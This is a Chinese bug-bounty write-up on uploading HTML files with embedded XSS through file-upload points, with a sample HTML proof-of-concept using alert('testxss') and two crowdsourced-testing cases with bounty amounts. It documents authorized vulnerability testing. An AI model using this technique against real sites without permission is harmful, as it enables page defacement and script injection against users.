---
title: 文件上传html嵌套xss语句
slug: "0169"
---
# 文件上传html嵌套xss语句

#### 0x01漏洞描述

在我们文件上传的时候很有很可能会遇见无法上传马子的情况，我相信很多人在这个时候都会直接不管这一个上传点，然后在企业src里面这样的上传点可以试试上传一个html文件配合xss语句，导致一个挂黑页弹窗的危害，在众测里面达到了中危的标准



#### 0x02.漏洞测试工具：

Burp  html配合xss语句的文件



<!DOCTYPE html>
<html>
        <head>
                <title></title>
                <meta charset="utf-8">
                <script type="text/javascript">
                        alert("testxss");
                </script>
        </head>
        <body>


        </body>
</html> 



漏洞点及测试方法

漏洞点：存在文件上传的地方

测试方法：在文件上传的时候上传Html嵌套xss语句



#### 0x03案例：

一次的众测活动中，看见一个营业职照的上传点，能上传马子但是不解析，于是随手改为html上传成功。赏金（800r)



![img](/proxy/https://cdn.nlark.com/yuque/0/2026/png/60657001/1779970354638-802504e5-87f2-408b-977e-cdc8e2c66882.png)

最终获取中危等级 800元



![img](/proxy/https://cdn.nlark.com/yuque/0/2026/png/60657001/1779970354682-2dcd86f4-9e2e-4a2c-b467-88d68a2f9461.png)

![img](/proxy/https://cdn.nlark.com/yuque/0/2026/png/60657001/1779970354697-62e5e1a8-3a41-43b3-9e18-6a72c87c8d91.png)

案例2：某src的文件上传xss（赏金100r）

![img](/proxy/https://cdn.nlark.com/yuque/0/2026/png/60657001/1779970354789-42f4dda0-1bf0-4f19-93a7-05114518dc37.png)





同样的在页面找到文件上传的地方



![img](/proxy/https://cdn.nlark.com/yuque/0/2026/png/60657001/1779970354774-479a81ce-d6a6-4b2a-badc-f133fec08241.png)



![img](/proxy/https://cdn.nlark.com/yuque/0/2026/png/60657001/1779970355315-d42d60a4-ddd6-4d8e-90bc-a03d71684b09.png)

![img](/proxy/https://cdn.nlark.com/yuque/0/2026/png/60657001/1779970355165-1376988b-e60c-4875-b2cc-97a1a79cec59.png)
